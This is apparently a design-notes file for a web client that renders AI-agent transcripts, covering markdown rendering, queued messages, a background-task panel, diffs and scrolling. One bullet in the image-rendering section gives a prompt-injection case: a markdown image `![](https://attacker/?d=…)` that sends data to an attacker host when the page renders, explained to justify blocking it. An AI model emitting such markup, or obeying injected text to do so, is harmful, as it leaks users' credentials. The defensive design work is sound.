---
paths:
  - packages/web/src/ui/tail.ts
  - packages/web/src/ui/EventList.tsx
  - packages/web/src/ui/follow.ts
  - packages/web/src/ui/autosize.ts
  - packages/web/src/ui/TaskPanel.tsx
  - packages/web/src/tasks.ts
  - packages/web/src/ui/Markdown.tsx
  - packages/web/src/ui/DiffView.tsx
  - packages/web/src/ui/AskCard.tsx
  - packages/web/src/ui/PermissionCard.tsx
  - packages/web/src/ui/ElicitationCard.tsx
  - packages/web/src/ui/Bubble.tsx
  - packages/web/src/ui/ImagePreview.tsx
  - packages/web/src/ui/links.ts
  - packages/web/src/diff.ts
  - packages/web/src/permission.ts
  - packages/web/src/ask.ts
  - packages/web/src/elicitation.ts
  - packages/web/src/preview.ts
  - packages/web/src/store.ts
---

**The transcript.** Agent output is markdown and is rendered as such; raw HTML
stays off, because it is untrusted text quoting an untrusted repository. A
person's own message is not markdown at all — see below.
`Markdown.tsx` is memoised on the joined text of a coalesced run.

- **Markdown renders what somebody wrote, including the marker they wrote it
  with.** `1)` and `1.` are both CommonMark and **mdast records neither** — a
  `list` node carries `ordered`, `start` and `spread` — so `list-style-type:
  decimal` drew `1.` over a message that said `1)`. `remarkListDelimiter` in
  `ui/mdlist.ts` reads the delimiter back out of `file.value` at the node's own
  `position.start.offset` and marks the list; `index.css` draws the marker with
  `counter(list-item)` on `::marker`. Its own module because `Markdown.tsx` cannot
  be imported offline. **`list-decimal` stays on the element**: a browser that
  will not style `::marker` then draws exactly what it drew before, so there is no
  third state. `start` is passed through as well, which it was not — a message
  beginning `10)` was renumbered as well as re-punctuated.
- **A message you have sent and not had back is a row in the conversation**, from
  `echo.ts` through `SessionView` — never a bubble under the transcript, which is
  where `Composer` used to draw it with a spinner beside it, and from where it
  jumped into the transcript one commit later when the `prompt` event landed. It
  is drawn **above** the working line, because `applySnapshot` can mark a session
  running while its own event is still on the socket. Nothing says "sending": a
  refusal puts the text back in the box with a toast, which is a remedy rather
  than a warning. Keyed by session, so leaving mid-send and coming back still
  shows it. Settled in `store.ts` in the commit its own `prompt` event lands
  in — `claimEcho` knows it before the POST names a seq, or it is drawn twice —
  or by seq when the POST answers first. Q3.653.
- **A message the agent has not been given yet says so, and only where that is
  true.** A `prompt` row whose seq is in the snapshot's `queuedPrompts` draws one
  line under the bubble, `Waiting for the agent to finish`. Nothing is drawn where
  the message was *steered* into the running turn — it is already in front of the
  model, and a status line for something that has already happened is furniture.
  ⚠ **Not the `pending` marker `Bubble.tsx` forbids**: that rule is about a
  message *this tab* has sent and not had answered, a claim about the network
  drawn as doubt over something delivered. This is the daemon reporting a fact
  about the agent, it survives closing the tab, and the bubble is untouched.
  `QueuedContext` carries it for `DecisionsContext`'s reason, and its **identity**
  is part of the contract — `SessionView` memoises the set on the seqs, or every
  bubble re-renders on every token. `mid-turn-messages.md`, Q3.601.
- **A turn that stopped says so in words, and a cancel says it where `working…`
  was.** `stopReasonText` and `resolvedByText` in `tail.ts` replace three places
  that drew a wire identifier with its underscores taken out (`turn cancelled`,
  `pump failed`, `ended: agent_exited`); `bits.tsx`'s `exitText` is the third.
  `cancelled` is the only one somebody *did*, so it takes `WaitingFoot`'s own
  shape — same line, `WorkingMark still`, `text-danger` — and lands in the row the
  working line held an instant earlier, a cancelled turn's `turn_end` being its
  last event. Every other reason stays a centred line. **Every table falls through
  to the identifier for a value it does not know**, which is the rule everywhere
  else on this wire: legible, and never a guess. What is drawn changed and nothing
  else did — `taskFloor` still keys on `stopReason !== "end_turn"` alone, and
  `showsInTranscript` on that plus the `agent_error` exception one bullet down.

- **The working line means the agent is working, turn or not** (`unpromptedSince`,
  Q2.233, timed from `workStartedAt`), **and counts what it said since its last tool
  call**: text and thoughts since the newest `tool_call`, `prompt`, `turn_end` or
  `context_cleared`, characters over four. `streamedSinceTool` is one step a token,
  handed to the foot alone. ⚠ **Drawn, never spoken** (`aria-live`). Q3.644. Its
  room is kept while it is silent, `keepsFootSlot` (Q3.653).

- **A run of agent text is keyed on `messageId`, not only on `role` and
  `thought`.** A run joins its parts with **no separator** — right for the
  streamed fragments of one message, wrong for two messages in a row. ACP's own
  rule: *"a change in `messageId` indicates a new message has started."*
  - **⚠ The spec alone does not close it.** `claude-agent-acp` publishes its
    `**Task stopped by user:** <name>.` line as a *bare* update with no id, so
    twenty stops drew as one paragraph of twenty run-together sentences. The
    daemon therefore numbers what the agent did not: the first id latches, and
    after it an unnumbered message gets a `~`-prefixed id of its own. An agent
    that numbers nothing keeps `null` and joins exactly as it does today — that
    arm is what the driver protects. Q3.604.

- **Background work is drawn on one surface, and there are two ways in.**
  `WaitingFoot` counts both sources and opens `TaskPanel` — but it is drawn only
  while something is **outstanding**, so the moment the last task ended the record
  the panel keeps became unreachable. The session header's kebab is the other door
  and is why that kebab now exists at every width: `Background tasks` is on no rail
  row, unlike every other row in it. Q3.631.
  `WaitingFoot` counts both sources and opens `TaskPanel`; it holds no list of its own and claims no region under it
  (`aria-haspopup="dialog"`, never `aria-expanded`). The panel's own decisions —
  the section order and labels, the chip table over the five states, the duration
  and token formatters, the four-cell meter — are `tasks.ts`, so `webcheck` drives
  them with no DOM. Every string and rule there is Claude Code's
  `background-tasks-dialog`, read out of the installed binary; **where this app
  departs it is because the wire has no such field**, and each departure is named
  at the code. Q3.603.
  - **Two placements, one element, and the breakpoint is answered only in CSS.**
    A bottom sheet below `md`, docked right from `md` with `SessionView` taking
    `TASK_PANEL_GUTTER` — `calc` of the same custom property the panel's own width
    is, so the two cannot drift and neither is a literal a reader can drag away
    from. **It is resizable there, on the rail's own separator**; the widths, the
    exit animation and every measurement behind both are `docked-panels.md`. It
    **portals** — `fixed` only means the viewport where no ancestor carries a
    `transform` or `backdrop-filter`, and the header and composer here are one hop
    from one — and it is **`menu`** in `overlay.ts`, never `sheet`: `sheet` puts
    `inert` on `#root`, which from `md` would switch off the conversation it is
    docked *beside*, and making that conditional is breakpoint state in
    JavaScript.
  - **The finished band folds, and it stands at zero.** `taskSections` moved a
    completed row to `Completed` all along — but a section is named only when
    something else is populated, so one workflow finishing alone kept its card in
    place at the same size with only its chip changed, and nothing said the word.
    `FinishedSection` is that band, and **`taskSections` no longer emits it** —
    the owner's rule is that Finished is reachable even when nothing exists, and a
    function returning a section per thing that exists cannot return one for a
    thing that does not. So `sections` means *how many live kinds* and the band is
    the panel's, which is what that function's docblock always claimed. One `bands`
    count replaced the two `sections.length` proxies the headings were gated on, or
    a lone live kind would have lost its label in silence. ⚠ **The band is gated on
    `reports`**: `Completed (0)` is a count, and a count of finished work is an
    *answer* — on the three agents that report no lifecycle it would assert exactly
    what the sentence beside it disclaims. And nothing to show is a **heading, not
    a fold**: a disclosure over an empty body is a control that lies, which was
    already reachable by clearing the list. It is seeded closed **in the section
    rather than in `TaskPanel`**, because the panel renders nothing while `!shown` and everything
    below it unmounts on every close — which is the whole of "collapsed by default"
    with no state to store — while `TaskPanel` itself is rendered unconditionally
    and would keep it. The clear **hides, and destroys nothing**: the daemon has one
    background-task route and it is *stop*; it keeps terminal rows on purpose so
    this panel can answer *did that build finish*. So `finishedTasks.ts` is a module
    `Map` in memory, never `localStorage` — it is a claim about rows on a remote
    machine, and a crash, the agent's `/clear` and eviction at the cap each
    destroy those with nothing to tell the browser. It **replaces** rather than
    unions, which is the prune that keeps it a subset of the wire. And the hidden
    set never reaches `tasks.ts`: pushed in there the band would vanish when
    emptied, which is the owner's rule reversed by a change that reads as a
    simplification. ⚠ **The count is not Claude Code's.** Theirs is a lifetime list;
    ours is how many finished rows the daemon still holds — capped with live rows at
    `MAX_TRACKED_ASYNC_TASKS`, lossy oldest-finished-first, kept across an agent
    swap and a clean restart, and gone on a crash. Q2.234.
  - **⚠ A workflow's agents are not on this wire and the panel says nothing about
    them.** The adapter marks every `local_agent` task `ignored` before publishing,
    and no payload carries a phase, a fraction, a model or a count. So `Phases` is
    one phase titled `Agents` — Claude Code's own fallback — with no fraction
    (their rule for a zero total) and **no rows**. An empty table under a heading
    would be a claim about ten agents that are running.
  - **⚠ The empty state is a three-valued partition, and it was a boolean.**
    `No tasks currently running` is true for claude and false for the other three,
    so it is gated — but `reportsBackgroundTasks: false` is **two** facts. The
    daemon's own docblock calls it *"nobody asked"*, and `doStop` sets it, which a
    restart reaches for every session. So with no agent attached the panel asserted
    *"This agent doesn't report background work"* about claude. `backgroundReporting`
    in `tasks.ts` splits it on `hasLiveAgent` — the predicate that already existed
    for *"the statuses in which an agent process exists and can be asked
    something"*, `stopping` excluded on a measured argument — and a missing row
    lands in the same arm, whose sentence is worded to be true of both and to name
    no agent at all. The sentences are a `Record` over the union, so a fourth state
    is a compile error and the partition is swept rather than the shape of an
    expression. The finished band is barred there with `silent`, for one reason:
    the daemon's rows are gone after a crash or on an older daemon, so a zero would
    say *nothing finished* about a session that may have finished ten things.
    Q3.633. ⚠ A swap passes through `unasked`; `showFinished` reading the rows is
    what keeps the band and its fold. Q2.234.
  - **⚠ Elapsed time comes from `startedAt`/`endedAt`, never `usage.durationMs`.**
    The agent's duration rides a *progress* frame and the adapter drops both the
    final `usage` and `end_time`, so a finished task's own number is stale and a
    quiet one has none. This is also the one place in this app that schedules a
    render for a clock, and it is affordable only because it is scoped to a
    surface somebody opened.

- **A link is drawn only where there is somewhere to go.** `openableHref` in
  `ui/links.ts` allows `http`, `https` and `mailto`, answers `null` for everything
  else — a path, a `file://` URI, a fragment — and the text is still drawn without
  an anchor. Widening that set is launching a program named by an agent-chosen
  string, the same judgement as the refusal of `url`-mode elicitation, and a
  workspace file is reachable through `GET /sessions/:id/files` with a header
  rather than an `href` a browser follows. **Not an XSS fix**, said out loud so
  nobody deletes the real guard: `javascript:` never reaches it, react-markdown
  empties that upstream. Q3.300.
- **An image is drawn as text for the same reason, only more so — it needs no
  tap.** `Markdown.tsx` must override `img` and bind **no `src`**. react-markdown's
  default transform allows `https:`, so `![](https://attacker/?d=…)` makes the
  browser fetch a host the *agent* chose, on render, with no interaction, from the
  origin holding `reemoat.credential` — prompt injection planted in a README, an
  issue body or a fetched page is the whole delivery mechanism and the query string
  is the channel. The alt text is kept and nothing regresses, because there is no
  image an agent can name that this origin would serve: a workspace file is fetched
  with a header and rendered by `ImagePreview` from a `Blob`. The document's **CSP**
  is defence in depth rather than the fix — `connect-src` is built from `relayUrl`
  and lists the relay's `wss` origin as well as its `https` one, this page being
  deliberately cross-origin to the fleet. Q7.86.
- **A conversation is read from the top, so it loads from the top.** There is **no
  render window**; `loadAll` pages backwards at `EVENTS_PAGE_LIMIT` a time until it
  reaches the start of the log, the agent's own `/clear`, or the tab's 16 MiB
  ceiling, with no per-run budget and no control offering to fetch more. What pays
  for it is `sameNode`, and `decisions` is a context rather than a prop because a
  fresh `Map` per event defeats that memo on every row at once. Q3.114.
- **A cold load has nothing to draw and must say so.** `reattachSince(null, …)`
  attaches at the tail, so history arrives only over HTTP; `TranscriptSkeleton` is
  keyed on `unfetched > 0` and **not** on `loadingHistory`, so a session that
  really has no events says so with no skeleton first and a failed page does not
  blink the skeleton out and back. `SessionView` draws the same shape before its
  *row* has landed — `missingRowReason` and `AppState.listed` — that session not
  being knowably absent until a list has come back from its machine. Q3.419.
- **The only cut is the agent's, and nothing offers to undo it**: `buildTail`'s
  third argument is `cut`, the newest `context_cleared`. Strictly *below* the
  marker, so the `/clear` prompt goes with the conversation it ended and the marker
  is the top row, drawing **both** facts — the command as a `UserBubble` and a
  hairline rule reading *Context cleared* — since `clearContext` is the only thing
  that emits one and `server.ts` reaches it only on that exact string.
  ⚠ **A reveal control and its `revealedBeforeClear` flag are deleted** (Q3.582):
  `loadStop` stops at `clearedAt` unconditionally, `nextCut` answers one number, and
  `transcriptNotice` stays silent under a cut. The events stay on the daemon and
  nothing here reads them.
- **The daemon's bookkeeping is not part of the conversation.**
  `showsInTranscript` refuses status lines, workspace rows and
  `turn_end: end_turn`. Every *other* stop reason is kept — `max_tokens`,
  `refusal` and `cancelled` are turns that did not finish — with **one exception
  that is silent for the opposite reason**: `agent_error`, the end the daemon
  writes for a turn the agent rejected, is not drawn because the row immediately
  above it is that rejection in the agent's own words. It still raises
  `taskFloor`, which runs before the gate: "nothing is drawn for it" and "nothing
  happened" are different sentences, and `webcheck` pins the pair. Q2.218.
- **A thought is not drawn.** The suppression is in `tail.ts`, not the JSX, so a
  refused node spends no render budget — and a dropped thought still *flushes* the
  run, since parts join with no separator.
- **An event nobody draws does not break the message either.** `buildTail` flushes
  the text run only when the event is *not* in `TRANSCRIPT_SILENT`, whose
  boundaries are invisible; flushing unconditionally splits one streamed message
  into two independently parsed `<Markdown>` blocks. Keyed on the **set** and
  deliberately not on `showsInTranscript`, which also answers false for
  `turn_end: end_turn` — that one *is* a boundary, and `webcheck` fails in both
  directions. Q3.100.
- **A request and its answer collapse to one row**, keyed on *whether an answer
  exists* rather than on the request's `decision` field, which the daemon leaves
  null for the request's whole life. A question is drawn as an exchange (the
  answer entered the model's context); an approval is drawn as one line.
- **A settled question draws what was asked, not just what was picked.**
  `ElicitationResolvedEvent` carries `message` plus `{key, label, value}` per
  answer, and for a multi-question form `message` is the adapter's preamble while
  each real question sits in its field's *description*, which the resolution does
  not carry — so the row read *"Please answer the following questions."* over four
  bare values. `answeredQuestions` recovers the wording from the arguments of the
  tool call `askedThrough` merges away, joining **by identity on the chosen label**
  and never by parsing `question_0` / `<question>__other`, which are two adapters'
  spellings of one idea. A label two questions share matches neither, because
  attributing an answer to the wrong question is worse than attributing it to none.
  The join is in `tail.ts` and arrives as `EventNode.asked`, the same arrangement
  `heading` uses; `null` means *draw what you drew before* and is reached three
  honest ways — the call is outside the window, its `rawInput` is the
  `{truncated, bytes}` stand-in, or the form was never an `AskUserQuestion`.
- **Consecutive plan updates are one card, drawn where the newest one landed.**
  One `TodoWrite` emits a `plan` per streaming refinement — nine events for a
  three-item list, each a full replacement — so the same checklist was drawn nine
  times in a row. `planFloor` in `buildTail` suppresses an older one, and
  **"consecutive" is over *emitted nodes***: over raw events an invisible
  `session_info_update` saves a stale card, and over *drawable* events a
  `permission_request` this walk merges away does. It is one compare, because
  `collected.length` already is that count. **The flush is untouched and that is
  provable rather than a compromise** — `flush()` runs *before* the node decision,
  so an open text run grows `collected` and the older plan is therefore drawn: a
  plan with a message on either side of it is always a real boundary. `plan` stays
  **out** of `TRANSCRIPT_SILENT`, where it would be a lie. Nothing says how many
  were absorbed, and the "a number survives collapse" idiom does not extend: the
  surviving card already contains everything every absorbed update said. ⚠ The row
  is keyed on the newest plan's seq, so an update remounts it — safe only while the
  plan arm holds no component state. Q3.455.
- **Only the text is selected**, and it is one property in `index.css`:
  `column-span: all` on the markdown body, the user bubble and the transcript
  column, plus `pre`, `td` and `th` inside them. WebKit paints *selection gaps* —
  a line's end to the block's content edge, and the space between two blocks — and
  a block its `isSelectionRoot` answers for paints none. ⚠ **Three placements
  because a `flex` container between the root and the text puts the fill back**,
  measured: depth, padding and `w-fit` change nothing, flex alone restores it, and
  the bubble hangs in a flex row. ⚠ **Not a transform**, which is the other
  trigger and is identical in WebKit: it also makes a stacking context, and a `td`
  in one moved a 1px table border in Chromium. `pre`/`td`/`th` are an ablation —
  nothing above the cells substitutes. What it cannot reach is the **anonymous**
  block a tight list item wraps its sentence in; `remarkListItemBlocks` marks such
  an item `spread` so the paragraph comes back, costing no pixels. The zero-width
  `::after` this replaced is **gone**, not kept beside it. Blink is byte-identical
  either way, paint and copy. Q3.638.
- **A person's message is drawn exactly as sent, and never parsed.** `UserBubble`
  draws one text node, `whitespace-pre-wrap wrap-anywhere`: `1)` stays text, not a
  `::marker`; `**x**` stays asterisks. Every row of a person's words is that
  component. ⚠ **Reverses Q3.639**: with no parse there is no `<br>` to double. No
  anchor — it turns a drag into a link drag. The composer sends `sentText` (blank
  lines around and trailing whitespace go, indentation stays). **The box never
  rewrites a keystroke**: `VERBATIM_FIELD`, and the shell's defaults. Q3.646, Q3.647.
- **A bubble is sized to the text it ended up holding**, `ui/hug.ts`. CSS cannot:
  `fit-content` is `min(max-content, available)` and wrapped text has a max-content
  wider than available, so the box sits at its `max-w` however short its longest
  line falls — 31px of grey past the sentence. ⚠ It was *reported* through the
  selection and that half is now the rule above's; what keeps this is the 31px
  with nothing selected at all. ⚠ Three properties are
  asserted rather than assumed, each measured: reset-then-read-then-write, never
  interleaved (1.6ms against 25.7ms for 300 bubbles); **one** shared
  `ResizeObserver` watching each *row*, because a conversation is drawn whole here
  and per-message would be hundreds; and lines walked as **text nodes**, since
  `getClientRects()` answers a rect per element too and one range over the wrapper
  hands the box its own width back — one `pre-wrap` node answers a rect per line
  and a zero-width one per newline, measured. It declines attachments and images.
  It writes a layout value from JS, which `AppShell` forbids — the exception and
  its three bounds are Q3.637.
- **What is selectable in a user's message is a wrapper *inside* the padding**, with
  `select-none` on both the row and the padded box. WebKit fills the selection gap
  to the bottom of the block a selection ends in, so a padded selectable block
  paints its own padding. ⚠ `select-text` on the box was the first repair and was
  measured — in a real `WKWebView`, driving `NSEvent` drags, since a programmatic
  `Range` ignores `user-select` and paints the same either way — to change
  **nothing**: 255×31 with it and without it, against 248×20 once the class moved
  inside. `display: inline` on the paragraph painted 31 too; the property is where
  the selectable block's edges are. One trailing `\n` stays, and it is WebKit's
  block boundary rather than the two breaks a browser writes. Nothing on the write
  side is implicated — the stored event is what was sent. ⚠ The
  *fill* this bullet reasons from is gone — the rule above stops it — so read this
  as which element is selectable and not as where the painting ends. Q3.636.
- **A run of consecutive tool rows is one row.** `foldRuns` folds it into a
  `GroupNode` carrying a mechanical sentence — clauses from ACP's `kind`, in the
  order each first appeared, with `+N −M` beside it — that opens to the rows it
  replaced. A run of **one** is never wrapped. Open is three-valued for
  `ultracode`'s reason: `null` follows the run, which decides on **one** thing,
  whether it has finished, and a tap outranks that for good. A failure deliberately
  does **not** open it — `override` is component state while `failed > 0` is
  permanent — so `1 failed` rides the collapsed row instead, a bare `ToolCall`
  opening itself on failure only because it has no count of its own. ⚠ That last
  clause said *"no badge"* while `1 failed` was one; it is a bare `text-muted` run
  of text now, because `Badge`'s plain tone is `bg-raised` — the fill a user's
  message is drawn in — so a machinery count was painting the conversation's own
  rectangle. What the rule rests on is that the collapsed row **says the number**,
  never what shape it says it in. The re-measure is an
  effect on `open` and not a call in the tap handler, because tool calls interleave
  and only one of the two triggers is a tap. Q3.105.
  **What a run may never swallow**: a **refusal** or an answer nothing can classify,
  an unanswered request, any question, a subagent (its card is already a summary of N
  steps), an orphaned failed update, and anything that is not a tool call. Each
  **breaks** the run in two.
  An **approval** does fold, in document order, with `N approved` on the collapsed
  row — the same "the number survives collapse" idiom as `1 failed`. The asymmetry
  that remains is the true one: **a refusal cannot be hidden**, because `tail.ts`
  merges the request away and the answer is the only record that somebody said no.
  The verdict is asked of `permissionDecisions` and never of `outcome` —
  `selected` includes every `reject_*` option — and every unknown answer falls
  through to *not foldable*, so a failure to classify shows a row rather than
  hiding a refusal. Q3.106.
- **A file change draws a diff, and the counts are the client's own.** `diffLines`
  in `packages/web/src/diff.ts` is the one line-diff in this package, so the approval card and
  the transcript share `ui/DiffView.tsx` rather than resembling each other: a trim
  plus a **bounded** LCS, because codex sends whole files on both sides where
  claude sends a fragment. The counts come from the event, so they state the
  replacement the agent *stated*; `GET /sessions/:id/changes` has git's own numbers
  and is deliberately not called. Two facts are accepted rather than fixed: a
  claude `Write` reports `oldText: null` even when overwriting, so an overwrite
  reads as a creation; and an event clipped by the 128 KiB cap has both sides cut
  at the same offset, so `unavailable` refuses to draw a diff at all and
  `changeCounts` answers `null` rather than 0 — `?? 0` would report the largest
  edit in the log as an empty one. Q3.104. One edit reported twice (kimi's `diff` +
  `fs_write` pair) is one row: matched on the **path**, one credit per absorbed
  change, spent once and in one direction only — never on content, which is
  Q3.108's own correction.
- **A gap is only ever one the daemon reported**, never one the client invented out
  of its own decision not to fetch. Real retention loss is a line at the top from
  `daemonFirstSeq` and `loadedFrom` rather than a `GapMarker`, the daemon evicting
  a *prefix* that is structurally outside any rendered window, and it is drawn only
  once paging has reached the floor (`unfetched === 0`). Q3.46, Q3.47.
- **A conversation loads whole.** `MAX_TRANSCRIPT_BYTES` (16 MiB) is the only
  ceiling **on one conversation** — no event count beside it, because two bounds on
  one resource means the wrong one decides. It was documented as the *tab's* only
  ceiling and was not one: nothing evicted a transcript, so a tab that visited N
  conversations retained N of them, each entitled to 16 MiB. `MAX_HELD_TRANSCRIPTS`
  (12) is the other half, applied in `trimTranscripts`, and **a session with a live
  stream is never evicted** — so what goes is somewhere you navigated through, at the
  cost of the re-fetch a cold open already pays. `HISTORY_PAGE`/`EVENTS_PAGE_LIMIT` are 5000, a round-trip
  count in disguise since a window spans that many seqs; raising it is free because
  `EVENTS_PAGE_BYTES` (768 KiB) is what actually bounds a page — lowered from 2 MiB
  as the coupled half of `STREAM_WINDOW_BYTES`, so at 5000 seqs the byte cap is what
  governs for anything but a trivial page. Q3.114.
- **Why a conversation does not start at its beginning is *one* answer, and every
  state of it says something.** `transcriptNotice` in `store.ts` is six-valued —
  `skeleton`, `loading`, `stalled`, `ceiling`, `floor`, `empty` — and `EventList`
  draws exactly what it answers, through a single string that also feeds the
  `role="status"` region. It lives beside `loadStop` because the two read the same
  five `Transcript` fields from opposite ends: that one decides whether paging
  carries on, this one says why it is not there yet. `webcheck` asserts the
  **totality** over a 720-state grid — with history outstanding and no cut,
  something is always said. Q3.112.
- **Only the reader takes the conversation off its foot**, `ui/follow.ts`: every
  commit, an observer on box and content, and every scroll event pin it before
  paint. A move is judged from where the box was left: growth after a pin, or a
  clamp the box's growth explains, is none. **A send lands at the foot.** A resize
  writes the offset through (`resync`, Q3.664); `[overflow-anchor:none]`: Chrome
  doubled history shifts. Q3.648.
- **Wrapping moves nothing.** `fitToContent` holds the form's height when
  measuring; the ask card reports in layout effects. Q3.649.

## Layout

| File | Holds |
|---|---|
| `packages/web/src/ui/tail.ts` | The transcript's shape as pure functions: coalescing, the five-events merge, which card a step belongs to, what it refuses to draw, where a `/clear` cuts, what a permission was answered with, `sameNode` — and which rows stand together: `foldRuns`, the clause grammar behind `runSummary`, and the one direction in which a duplicated `file_change` is dropped |
| `packages/web/src/diff.ts` | What a file change was, as lines: the trim, the bounded LCS, hunks with two sets of line numbers, the word-level marks, the `+N −M`, and the refusal to draw a diff over an event the log clipped. The `WeakMap` behind `changeCounts` is why `buildTail` may ask on every token |
| `packages/web/src/ui/DiffView.tsx` | A file change, drawn — for the transcript **and** the approval card. Its body paints `bg-surface` inside a `raised` frame because that is the ground the two tints were measured against; on `raised` they are 1.03:1, i.e. invisible |
| `packages/web/src/ui/follow.ts` | Whether the conversation holds its foot: `followsAfterScroll` (pure) and `useFollow` |
| `packages/web/src/ui/links.ts` | `openableHref`: which schemes a tap in agent output may open, and why a relative path is text rather than a link. Named for the case collision with `Markdown.tsx` on a case-insensitive filesystem |
| `packages/web/src/ui/Markdown.tsx` | Agent output as markdown; code blocks with a lazily-loaded highlighter |
| `packages/web/src/ui/mdlist.ts` | Which ordered lists were written with `)`, recovered from the source because mdast throws the character away. Pure, so `webcheck` imports it |
| `packages/web/src/echo.ts` | The message that has been sent and has not come back: a module `Map` with subscribers, keyed by session, the third of `attach.ts`'s shape. At `src/` because `store.ts` settles it |
| `packages/web/src/ui/Bubble.tsx` | The user's own messages, right-aligned and drawn as sent. One component for every call site, and **no `pending`** — a sent message looks sent |

## Bounds

| | |
|---|---|
| Transcript diff | **250 000 LCS cells** (`MAX_LCS_CELLS`) after the prefix/suffix trim, past which it degrades to one replacement block and says `wholeFile` — Q3.104. 60 drawn lines per file (`DIFF_MAX_LINES`), with `omitted` carrying the rest and the counts staying the **true** totals. 2 lines of context (`DIFF_CONTEXT`). A word-level mark is dropped once it would cover more than 60% of its line (`MAX_MARK_SHARE`), past which the two lines are not one line edited and the row tint has already said so — Q3.301. 400 chars (`MAX_MARK_CHARS`) is the longest pair compared character by character. `changeCounts` memoises in a `WeakMap` keyed on the event, so a diff is computed once per event for the life of the tab |

**A download button draws nothing for a location outside the workspace** — not a
disabled button, and not one that toasts when it is pressed. It lived in
`web-composer.md` until the sheet work needed the characters, which is where it
should have been all along: the button is `EventList.tsx`'s, and the composer has
never drawn one.

## Two rules that were filed under the shell

They arrived in `web-shell.md`, where the palette was written down, and are about
**the transcript**. Moved, not copied; this file's globs summon them.

- **Machinery is `text-fg/85`, one value for every machinery row, failures
  included**; the `X` at full `fg` and `N failed` carry a failure instead of
  weight. A permission row reserves the kind-glyph slot **empty**, because it
  folds into a run. Q3.207.
- **A title is clipped in code, and only when the clip pays for a line** —
  `truncate` throws away "was anything cut", which decides whether a card can be
  opened at all. `TITLE_CHARS` 80, `TITLE_OVERFLOW_MIN` 20; the body opens to the
  title in full. `headlineWorthDrawing` is the same judgement one field over: a
  value whose opening 24 characters already appear in the title is an echo.
  Q3.208.
